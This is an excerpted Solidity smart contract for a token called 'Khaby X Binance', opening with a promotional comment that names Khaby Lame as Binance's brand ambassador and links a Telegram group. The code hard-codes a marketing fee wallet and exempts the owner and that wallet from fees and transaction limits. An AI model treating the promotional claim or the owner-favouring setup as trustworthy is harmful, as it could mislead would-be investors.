...
/**
        ...
        Meet Binance's new brand ambassador @KhabyLame, the most followed creator on TikTok 🤲🏾

        Welcome aboard Khaby! 

        https://t.me/khabyXbinance
...
contract KhabyXBinance is ERC20, Ownable {
    using SafeMath for uint256;
    address routerAdress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Khaby X Binance";
    string constant _symbol = "KxB";
    ...
    address public marketingFeeReceiver = 0x882fFc500e2D6F3d5621E36605bEc93a3eae58eA;
    ...
    constructor () Ownable(msg.sender) {
        ...
        isFeeExempt[0x882fFc500e2D6F3d5621E36605bEc93a3eae58eA] = true;
        isFeeExempt[_owner] = true;
        isTxLimitExempt[_owner] = true;
        isTxLimitExempt[0x882fFc500e2D6F3d5621E36605bEc93a3eae58eA] = true;
